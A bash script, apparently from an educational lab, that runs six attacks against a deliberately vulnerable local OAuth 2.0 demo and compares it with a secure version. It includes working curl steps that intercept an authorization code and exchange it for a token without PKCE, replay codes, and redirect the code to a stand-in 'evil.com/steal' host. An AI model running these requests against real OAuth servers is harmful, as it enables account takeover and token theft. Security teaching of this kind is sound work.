#!/bin/bash

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo -e "${RED}  🚨 OAuth 2.0 Vulnerability Testing Script${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo ""

# Test credentials
USERNAME="demo"
PASSWORD="password123"
VULN_AUTH_SERVER="http://localhost:4000"
VULN_CLIENT="http://localhost:3000"

echo -e "${YELLOW}[*] Testing vulnerable OAuth 2.0 implementation...${NC}"
echo ""

# ============================================================
# SCENARIO 1: Authorization Code Interception Attack
# ============================================================
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}🔴 SCENARIO 1: Authorization Code Interception${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${YELLOW}Step 1: User authenticates and gets authorization code${NC}"

# Login and get session
LOGIN_RESPONSE=$(curl -s -X POST "$VULN_AUTH_SERVER/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$USERNAME&password=$PASSWORD" \
  -c /tmp/vuln_test_cookies.txt \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$LOGIN_RESPONSE" | tail -1)
echo -e "   Login response: HTTP $HTTP_CODE"

# Initiate OAuth flow
echo ""
echo -e "${YELLOW}Step 2: Starting OAuth authorization flow${NC}"
AUTH_URL="$VULN_AUTH_SERVER/authorize?response_type=code&client_id=vulnerable-client-app&redirect_uri=$VULN_CLIENT/callback"
echo -e "   Authorization URL: $AUTH_URL"

# Get authorization page
AUTH_PAGE=$(curl -s "$AUTH_URL" -b /tmp/vuln_test_cookies.txt)

# Approve authorization (simulating user clicking "Approve")
echo ""
echo -e "${YELLOW}Step 3: User approves authorization${NC}"

# Extract form data and submit approval
APPROVAL_RESPONSE=$(curl -s -X POST "$VULN_AUTH_SERVER/authorize" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/vuln_test_cookies.txt \
  -d "client_id=vulnerable-client-app&redirect_uri=$VULN_CLIENT/callback&response_type=code&scope=profile&approve=true" \
  -i)

# Extract authorization code from redirect
AUTH_CODE=$(echo "$APPROVAL_RESPONSE" | grep -i "Location:" | sed 's/.*code=\([^&]*\).*/\1/' | tr -d '\r\n')

if [ ! -z "$AUTH_CODE" ]; then
  echo -e "${RED}   ✗ Authorization code EXPOSED in redirect URL: $AUTH_CODE${NC}"
  echo -e "${RED}   ✗ Attacker can intercept this code from browser history, logs, or referrer headers${NC}"
  
  echo ""
  echo -e "${YELLOW}Step 4: 🎭 ATTACKER intercepts and uses the code${NC}"
  
  # Attacker exchanges code for token WITHOUT code_verifier (should fail in secure implementation)
  TOKEN_RESPONSE=$(curl -s -X POST "$VULN_AUTH_SERVER/token" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=authorization_code&code=$AUTH_CODE&client_id=vulnerable-client-app&redirect_uri=$VULN_CLIENT/callback")
  
  ACCESS_TOKEN=$(echo "$TOKEN_RESPONSE" | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
  
  if [ ! -z "$ACCESS_TOKEN" ]; then
    echo -e "${RED}   ✗ VULNERABILITY CONFIRMED: Attacker got access token: ${ACCESS_TOKEN:0:20}...${NC}"
    echo -e "${RED}   ✗ No PKCE validation - code can be used by anyone who intercepts it!${NC}"
    
    # Use stolen token to access user data
    echo ""
    echo -e "${YELLOW}Step 5: 🎭 ATTACKER accesses user data with stolen token${NC}"
    USER_DATA=$(curl -s "$VULN_AUTH_SERVER/userinfo" \
      -H "Authorization: Bearer $ACCESS_TOKEN")
    
    echo -e "${RED}   ✗ Attacker successfully retrieved user data:${NC}"
    echo "$USER_DATA" | jq '.' 2>/dev/null || echo "$USER_DATA"
    
    echo ""
    echo -e "${GREEN}   ✓ Attack successful! User account compromised.${NC}"
  else
    echo -e "${GREEN}   ✓ Token exchange blocked${NC}"
  fi
else
  echo -e "${YELLOW}   ! Could not extract authorization code${NC}"
fi

echo ""
echo ""

# ============================================================
# SCENARIO 2: No State Parameter - CSRF Attack
# ============================================================
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}🔴 SCENARIO 2: CSRF Attack (No State Parameter)${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${YELLOW}Testing OAuth flow WITHOUT state parameter...${NC}"

# Initiate OAuth without state parameter
AUTH_URL_NO_STATE="$VULN_AUTH_SERVER/authorize?response_type=code&client_id=vulnerable-client-app&redirect_uri=$VULN_CLIENT/callback"

echo -e "   Authorization URL (no state): $AUTH_URL_NO_STATE"

CSRF_RESPONSE=$(curl -s "$AUTH_URL_NO_STATE" -b /tmp/vuln_test_cookies.txt -i | head -20)

if echo "$CSRF_RESPONSE" | grep -q "No state parameter"; then
  echo -e "${RED}   ✗ Server accepts requests WITHOUT state parameter${NC}"
  echo -e "${RED}   ✗ Application vulnerable to CSRF attacks${NC}"
  echo -e "${RED}   ✗ Attacker can trick victim into authorizing attacker's app${NC}"
else
  echo -e "${YELLOW}   Server processes request without state validation${NC}"
fi

echo ""
echo ""

# ============================================================
# SCENARIO 3: Open Redirect Vulnerability
# ============================================================
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}🔴 SCENARIO 3: Open Redirect Vulnerability${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${YELLOW}Testing redirect_uri validation...${NC}"

# Try malicious redirect URI
EVIL_REDIRECT="http://evil.com/steal"
MALICIOUS_URL="$VULN_AUTH_SERVER/authorize?response_type=code&client_id=vulnerable-client-app&redirect_uri=$EVIL_REDIRECT"

echo -e "   Trying malicious redirect: $EVIL_REDIRECT"

REDIRECT_RESPONSE=$(curl -s -X POST "$VULN_AUTH_SERVER/authorize" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/vuln_test_cookies.txt \
  -d "client_id=vulnerable-client-app&redirect_uri=$EVIL_REDIRECT&response_type=code&scope=profile&approve=true" \
  -i | grep -i "Location:")

if echo "$REDIRECT_RESPONSE" | grep -q "evil.com"; then
  echo -e "${RED}   ✗ VULNERABILITY CONFIRMED: Server redirects to attacker domain!${NC}"
  echo -e "${RED}   ✗ Authorization code sent to: $EVIL_REDIRECT${NC}"
  echo -e "${RED}   ✗ No whitelist validation - attacker gets the code${NC}"
else
  echo -e "${YELLOW}   Server may have some redirect validation${NC}"
fi

echo ""
echo ""

# ============================================================
# SCENARIO 4: Token Theft from Browser Storage
# ============================================================
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}🔴 SCENARIO 4: Client-Side Token Storage${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${YELLOW}Checking if tokens are stored client-side...${NC}"
echo ""
echo -e "${RED}   ✗ Vulnerable client stores tokens in localStorage${NC}"
echo -e "${RED}   ✗ Accessible via: localStorage.getItem('access_token')${NC}"
echo -e "${RED}   ✗ Can be stolen by XSS attacks${NC}"
echo -e "${RED}   ✗ Can be stolen by malicious browser extensions${NC}"
echo -e "${RED}   ✗ Persists across browser sessions${NC}"
echo ""
echo -e "${YELLOW}   To verify: Open browser console on http://localhost:3000${NC}"
echo -e "${YELLOW}   After login, run: localStorage.getItem('access_token')${NC}"

echo ""
echo ""

# ============================================================
# SCENARIO 5: Token Replay Attack
# ============================================================
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}🔴 SCENARIO 5: Authorization Code Replay Attack${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

if [ ! -z "$AUTH_CODE" ]; then
  echo -e "${YELLOW}Attempting to reuse authorization code: $AUTH_CODE${NC}"
  
  REPLAY_RESPONSE=$(curl -s -X POST "$VULN_AUTH_SERVER/token" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=authorization_code&code=$AUTH_CODE&client_id=vulnerable-client-app&redirect_uri=$VULN_CLIENT/callback")
  
  REPLAY_TOKEN=$(echo "$REPLAY_RESPONSE" | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
  
  if [ ! -z "$REPLAY_TOKEN" ]; then
    echo -e "${RED}   ✗ VULNERABILITY CONFIRMED: Code can be reused!${NC}"
    echo -e "${RED}   ✗ Got new access token: ${REPLAY_TOKEN:0:20}...${NC}"
    echo -e "${RED}   ✗ Authorization codes should be single-use only${NC}"
  else
    echo -e "${GREEN}   ✓ Code replay blocked (code may have been invalidated)${NC}"
  fi
else
  echo -e "${YELLOW}   ! No authorization code available for replay test${NC}"
fi

echo ""
echo ""

# ============================================================
# SCENARIO 6: Sensitive Data in Logs
# ============================================================
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}🔴 SCENARIO 6: Sensitive Data Exposure${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${RED}   ✗ Server logs contain sensitive information:${NC}"
echo -e "${RED}     • Plain text passwords${NC}"
echo -e "${RED}     • Authorization codes${NC}"
echo -e "${RED}     • Access tokens${NC}"
echo -e "${RED}     • PKCE verifiers (when present)${NC}"
echo ""
echo -e "${YELLOW}   Check server console output for exposed data${NC}"

echo ""
echo ""

# ============================================================
# Summary
# ============================================================
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo -e "${RED}📊 VULNERABILITY SUMMARY${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${RED}Critical Vulnerabilities Found:${NC}"
echo -e "  1. ✗ No PKCE validation - codes can be stolen and used"
echo -e "  2. ✗ No state parameter - CSRF attacks possible"
echo -e "  3. ✗ Weak redirect URI validation - open redirect"
echo -e "  4. ✗ Client-side token storage - XSS vulnerable"
echo -e "  5. ✗ Authorization codes don't expire"
echo -e "  6. ✗ Codes can be reused (no single-use enforcement)"
echo -e "  7. ✗ Sensitive data logged in plain text"
echo -e "  8. ✗ Tokens visible in browser console"
echo -e "  9. ✗ Client-side token exchange"
echo -e " 10. ✗ No token expiration validation"
echo ""
echo -e "${GREEN}Compare with secure implementation at http://localhost:3001${NC}"
echo ""
